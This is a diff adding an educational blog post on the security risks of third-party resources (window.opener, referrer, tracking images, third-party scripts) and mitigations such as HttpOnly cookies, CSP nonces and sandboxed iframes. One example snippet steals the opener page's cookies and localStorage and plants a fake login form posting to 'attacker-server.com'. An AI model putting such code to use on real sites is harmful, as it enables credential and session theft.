@@ -1,0 +1,335 @@
+---
+title: Web security implications of 3rd party resources 🕵️‍♂️
+description:
+  Understand what you are opening your site up to when using 3rd party
+  resources.
+date: '2023-01-28T09:51:19.779Z'
+ogImage:
+  title: Web security implications of 3rd party resources 🕵️‍♂️
+readingTime: 8 min read
+tags: ['tech']
+---
+
+{/* !start-of-preview */}
+
+As a web developer, using 3rd party resources is extremely common. We use 3rd
+party JavaScripts all the time, either via `npm`, bundled into our code, or via
+`<script>` tag (e.g.: Google Analytics, etc). Embedding 3rd party images/media
+is also pretty common. Even linking to a 3rd party sites can have security
+implications!
+
+Let's go over some of the more common attack vectors when using 3rd party
+resources, what problems they may cause, and how to mitigate them.
+
+{/* !end-of-preview */}
+
+> TL;DR:
+>
+> Including 3rd party resources on a site opens up the possibility of the 3rd
+> party doing tracking and/or running code on the site; which can be used to do
+> anything from stealing data to modifying the page itself.
+
+## What are considered 3rd party resources?
+
+3rd party resources are resources that are not from the same origin as the
+current page. For instance, if you are on
+[https://jackyef.com](https://jackyef.com), then any resources not from
+[https://jackyef.com](https://jackyef.com) are considered 3rd party resources.
+Two origins are considered the same origin if they have the same **protocol**,
+**port**, and **host**.
+
+Some examples include loading JS from [UNPKG](https://unpkg.com), loading images
+from [Unsplash](https://unsplash.com), etc.
+
+Also, while technically not coming from a 3rd party origin, users' provided code
+can be considered 3rd party script as well, as it is essentially running code
+from an unknown source. The same applies for code coming from 3rd party package
+on `npm`.
+
+## Common attack vectors
+
+### `window.open()` and `<a>` with `target="_blank"`
+
+Sometimes, we might open a link in a new tab using either `window.open()` or
+`<a target="_blank">`. A couple of things to note when we do this are the
+`opener` and `referrer` behaviors.
+
+When linking to a page in the same origin with the `opener` feature enabled, the
+opened page will have access to some amount of the opener context via
+`window.opener` global variable. This means the opened page could do things like
+redirect the opener page, or even steal data from the opener page.
+
+```js
+if (window.opener) {
+  // Opened page can redirect the opener
+  window.opener.location = '/?status=redirected';
+
+  // ...or access some cookies and localStorage data
+  fetch('/api/steal-data', {
+    method: 'POST',
+    body: JSON.stringify({
+      localStorage: window.opener.localStorage,
+      cookie: window.opener.document.cookie,
+    }),
+  });
+
+  // ...or even modify the DOM of the opener page
+  const form = window.opener.document.createElement('form');
+  form.innerHTML = `
+    <input type="username" name="username">
+    <input type="password" name="password">
+  `;
+  form.action = 'https://attacker-server.com/steal-data';
+  form.method = 'POST';
+  window.opener.document.body.prepend(form);
+}
+```
+
+Try clicking on the button below to see an example.
+
+<LightButton
+  onClick={() =>
+    window.open(
+      '/posts/web-security-implications-of-3rd-party-resources/examples/opener',
+    )
+  }
+>
+  {`Open a page in new tab `}
+</LightButton>
+
+Fortunately, browsers automatically set `window.opener` to `null` if the target
+page is hosted on a different origin, so this attack vector is not that
+dangerous for most sites. Though if you are building a site like CodePen where
+you allow users to run arbitrary code on your origin, this could be a problem as
+it is essentially a cross-site scripting vulnerability. Imagine the script
+creating a fake login form (via `window.opener.document.append()` shenanigans)
+on your origin, but sending those data to their own server.
+
+`referrer` is less dangerous. It simply tells the server where the request is
+coming from via the `referer` header in the sent request. This is mostly used
+for tracking. It is how most analytics services know whether a user comes to
+your site from a social network site, search engine, or directly from the URL
+bar. if you are writing a blog post that has links to other sites and you don't
+want them to know that you are linking to them, you can use `noreferrer` so the
+request won't include the `referer` header.
+
+The default behavior for `window.open()` and `<a target="_blank">` is different.
+`referrer` is enabled on both by default, but `opener` is only enabled by
+default for `window.open()`. Refer to the following snippet to disable both of
+them.
+
+```js
+window.open('/some-page', '_blank', 'noopener,noreferrer');
+
+<a href="/some-page" target="_blank" rel="noopener noreferrer">
+  Some page
+</a>;
+```
+
+<Panel type="info" title="Some trivia">
+
+You might notice that I mentioned `referer` at some places and `referrer` at
+other places. They are actually referring to the same thing. The request header
+is spelled `referer`, which was actually a typo that was never fixed. In most
+other places, it's called `referrer`.
+
+Read more on
+[MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer).
+
+</Panel>
+
+### 3rd party `<img>`
+
+Embedding 3rd party images isn't as dangerous, but it still has some
+implications, especially in relation to tracking.
+
+Imagine that you built an authentication service, _Sign in with Gewgle_. Various
+sites use your services to allow their users to sign in. You provide unique
+profile image URLs for each user so the sites can render them.
+
+```js
+<img src="https://gewgle.com/users/:userId.png" />
+```
+
+Any site that renders this `<img>` is essentially always sending a request to
+`gewgle.com` whenever the page is loaded. As the owner of `gewgle.com`, you can
+now track the browsing history of your users. You can see which sites they visit
+via the `referer` header when the site sends an image request to `gewgle.com`.
+You can also approximately guess the time they visited each site by observing
+the timestamp of the image request.
+
+This is also a technique that email marketers use to detect whether their emails
+were opened by the recipients.
+
+<Panel type="info" title="The 'Do Not Track' header">
+
+Some browsers include a `DNT` header in the request, indicating that the users
+would not like to be tracked. Unfortunately, there is no guarantee that service
+providers would respect the header.
+
+Also, unfortunately, the feature is now
+[marked as deprecated on MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/DNT).
+
+</Panel>
+
+### 3rd party `<script>`
+
+Running 3rd party scripts on your site is essentially allowing the 3rd party to
+do a remote code execution on the computer of the users visiting your site. If
+it sounds dangerous, it is because it is! Though, we web developers have been so
+accustomed to including 3rd party scripts on our sites that most of the time we
+might not even think too much about it. Analytics scripts, ads, some services'
+SDK, libraries from `cdnjs` and `unpkg`, and so on!
+
+Once a 3rd party script is running on an origin, it can practically do
+everything we have mentioned so far. It is similar to the case with linking
+where the opened page gains access to `window.opener`, but this time it is more
+dangerous! The 3rd party script has access to the full `window` object. This
+opens up many possibilities, including but not limited to:
+
+- stealing unsecured cookies (`document.cookie`, `fetch()`)
+- accessing localStorage (`document.localStorage`)
+- scraping data in the document (`document.querySelector()`)
+- modifying the document to create fake interfaces
+  (`document.body.appendChild()`)
+- sending data to the attacker's server (`fetch()`)
+- and the list goes on and on!
+
+So, we better be damn sure that we trust the 3rd party when including their
+script on our site.
+
+## Mitigation strategy
+
+Fortunately, browser vendors have been working hard to add security features to
+prevent these attacks from happening and/or lessen the impacts when they
+actually happened.
+
+### Cookies
+
+Cookies are the most common way to store user-related data on the browser.
+Successfully stealing cookies means the attacker can impersonate the user and do
+whatever they want on the site. A few things to do to make sure your cookies are
+safe when an attacker is able to run a script on your site:
+
+- Use `HttpOnly` flag
+  - This prevents the cookie to be included in the returned value of
+    `document.cookie`
+- Use `Secure` flag
+  - This prevents the cookie from being sent over HTTP.
+- Do not use `SameSite=None` flag (unless you know what you're doing)
+  - [`SameSite=None`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite#none)
+    will mark a cookie to be included in requests to 3rd party origins.
+
+### Content-Security-Policy (CSP)
+
+CSP is a browser feature that allows you to specify which resources are allowed
+to be loaded or run on your site. It is a very powerful tool to prevent attacks
+like cross-site scripting.
+
+We are not going to cover everything CSP can do in this article, but the main
+idea is as follows.
+
+We set a `Content-Security-Policy` in the response header for our site. The
+header should exist in the response containing the HTML document.
+
+```
+Content-Security-Policy: script-src https://example.com/
+```
+
+With that set in place, any script not coming from `example.com` will not be
+run.
+
+```html
+<!-- this script will not be run -->
+<script src="https://not-example.com/js/library.js"></script>
+```
+
+What about scripts that run from a stored XSS attack? Those aren't from a
+specific origin, how do we block those?
+
+<Panel type="info" title="Stored XSS">
+
+An XSS that happens when a user managed to inject something like
+`<script>alert(1)</script>` into the page.
+
+</Panel>
+
+Fortunately, once we have a CSP header with `script-src`, inline scripts are
+automatically blocked. Though if we want to keep using inline scripts while
+still blocking the stored XSS scripts, we can do that by using a `nonce`.
+
+```
+Content-Security-Policy: script-src 'nonce-SomeRandomlyGeneratedUnguessableString';
+```
+
+With that set, the following inline script will be allowed by the browser to
+run.
+
+```html
+<script nonce="SomeRandomlyGeneratedUnguessableString">
+  alert('I am allowed to run!');
+</script>
+```
+
+If you're interested, you can go to
+[MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
+to see everything CSP can do.
+
+## Other cases
+
+### What if I _actually have to run_ users' provided code?
+
+CSP helps in preventing untrusted code from running, but what if we really need
+to run the users' code? What if we are running a platform like CodePen that
+allows user to write their own scripts?
+
+In those cases, we can do the followings:
+
+- running the code in
+  [a sandboxed `<iframe>`](https://web.dev/sandboxed-iframes/)
+- running the code in a separate origin. For instance, CodePen runs on
+  [https://codepen.io/](https://codepen.io/), but users' code runs on a separate
+  origin like [https://cdpn.io/](https://cdpn.io/). This automatically comes
+  with a lot of security benefits as most browsers do not share resources
+  between origins by default.
+
+If you are interested in how sites like CodePen handle these cases, give
+[User-Generated Content Safety](https://open.spotify.com/episode/0fIrlCOj5XAszSSXbaaNXG)
+(Podcast, [CodePen Radio](https://open.spotify.com/show/3bw3W59a83518ciCd3ehZV))
+a listen!
+
+### What about "3rd party scripts" from `npm`?
+
+Unfortunately, once a 3rd party script from an `npm` package made it to your
+JavaScript bundle, it would have as much power as your own code. Sure,
+technically you could make it so these codes are codesplitted differently, run
+on a separate origin, and pass the data you need via
+[`window.postMessage()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage).
+Though with that being said, for the most part, whenever you are using an `npm`
+package, you are essentially fully trusting that the authors have no malicious
+intent. This is why whenever a popular package is hijacked by a malicious actor,
+it's always a big deal. (see:
+[`ua-parser-js` case](https://blog.sonatype.com/npm-project-used-by-millions-hijacked-in-supply-chain-attack))
+
+---
+
+## Closing
+
+Embedding 3rd party resources of any kind comes with some security implications.
+3rd parties can do some clever things to track users, steal data, trick users,
+etc. Being mindful of these implications and understanding how they work is
+important to build a secure site.
+
+In a way, it is interesting that the web is largely built upon the idea of
+trusting 3rd party resources (think analytics scripts, SDK, images, etc.), even
+though the potential risk could be as high as a remote code execution
+vulnerability. Though, since the code is running on a browser, the risk might
+not be comparable to code running on an actual server.
+
+With that being said, it's also kinda amazing how browser vendors are able to
+keep shipping great security features with sensible defaults, mitigating the
+risks even more.
+
+_This article is not meant to be a complete guide to web security. It merely
+talks about some common security implications of embedding 3rd party resources
+on a site._
